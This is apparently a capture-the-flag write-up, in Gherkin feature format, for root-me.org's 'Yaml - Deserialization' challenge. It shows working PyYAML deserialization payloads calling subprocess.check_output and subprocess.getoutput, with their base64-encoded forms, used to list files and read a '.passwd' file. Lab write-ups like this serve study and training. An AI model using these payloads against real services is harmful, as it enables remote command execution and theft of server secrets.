## Version 2.0
## language: en

Feature: Yaml - Deserialization
  Site:
    root-me.org
  Category:
    Web-Server
  User:
    rocken2k
  Goal:
    Find and exploit the vulnerability to get the flag

  Background:
  Hacker's software:
    | <Software name> | <Version>     |
    | Kali Linux      | 5.10.         |
    | Firefox Quantum | 68.2.0esr     |

  Machine information:
    Given I am accessing the website through the URL
    """
    http://challenge01.root-me.org:59071/eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpb
    ml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg
    """
    Then I see the homepage with a "Coming Soon :)" message [evidence](1.png)

  Scenario: Fail: Decrypt the URL
    Given the parameter from the URL is in base64
    Then I try to decrypt the string
    And to decrypt base64 strings I use the following website:
    """
    https://www.base64decode.org/
    """
    Then I decrypt the parameter from the URL
    And I can see the following message [evidence](2.png)
    """
    yaml: We are currently initializing our new site !
    """
    But I can't see the flag
    And I can't solve the challenge

  Scenario: Fail: Trying to use a standard payload
    Given the title of the challenge is "Yaml - Deserialization"
    Then I search on google how to exploit yaml deserialization vulnerability
    And I find the following payload
    """
    !!python/object/apply:subprocess.check_output [
    !!str "ls",
    ]
    """
    Then I encrypt using base64
    And to encrypt base64 strings I use the following website:
    """
    https://www.base64encode.org/
    """
    Then I encrypt the payload
    And I get the following string
    """
    ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IF
    sKISFzdHIgImxzIiwKXQ==
    """
    And I insert the string as a parameter in the URL
    And the page loads a different message [evidence](3.png)
    But I do not find the flag
    And I can't solve the challenge

  Scenario: Fail: Using a different payload
    Given the decrypted URL starts with "yaml:"
    Then I use the following payload
    """
    yaml: !!python/object/apply:subprocess.check_output [!!str "ls",]
    """
    And I encrypt the payload using base64
    And I use this string as a parameter in the URL
    """
    eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IF
    shIXN0ciAibHMiLF0=
    """
    And I can see the current folder's content [evidence](4.png)
    But I can't see the flag
    And I can't solve the challenge

  Scenario: Success: Using another subprocess module from python
    Given that the previous payload only accepts one single command
    Then I search on google another type of subprocess module from python
    And after making some adjustments, I get the payload to see all the content
    """
    yaml: !!python/object/apply:subprocess.getoutput ['ls -la']
    """
    And I encrypt the payload using base64
    And I use this string as a parameter in the URL
    """
    eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuZ2V0b3V0cHV0
    IFsnbHMgLWxhJ10=
    """
    And I can see all the content [evidence](5.png)
    And I see one file called ".passwd"
    Then I use the following payload to see the file's content
    """
    yaml: !!python/object/apply:subprocess.getoutput ['cat .passwd']
    """
    And I encrypt the payload using base64
    And I use this string as a parameter in the URL
    """
    eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuZ2V0b3V0cHV0I
    FsnY2F0IC5wYXNzd2QnXQ==
    """
    And I can see the flag [evidence](6.png)
    And I submit the flag
    And I solve the challenge [evidence](7.png)
